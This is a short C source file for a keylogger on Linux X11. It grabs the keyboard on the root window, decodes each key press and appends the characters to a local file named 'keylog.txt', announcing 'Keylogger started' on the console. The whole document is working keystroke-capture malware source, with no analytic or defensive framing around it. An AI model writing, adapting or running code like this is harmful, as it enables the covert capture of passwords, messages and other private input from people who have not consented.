#include <stdio.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/Xutil.h>

void log_key(const char *key) {
    FILE *file = fopen("keylog.txt", "a");
    if (file == NULL) {
        perror("Error opening file");
        return;
    }
    fprintf(file, "%s\n", key);
    fclose(file);
}

int main() {
    Display *display;
    Window root;
    XEvent event;

    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Unable to open X display\n");
        return 1;
    }

    root = DefaultRootWindow(display);
    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);
    XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime);

    printf("Keylogger started. Logging to 'keylog.txt'.\n");

    while (1) {
        XNextEvent(display, &event);

        if (event.type == KeyPress) {
            char buffer[128] = {0};
            KeySym keysym;
            int len = XLookupString(&event.xkey, buffer, sizeof(buffer), &keysym, NULL);

            if (len > 0) {
                printf("Debug: Key pressed: %s\n", buffer);  // Debugging line
                log_key(buffer);
            }
        }
    }

    XCloseDisplay(display);
    return 0;
}
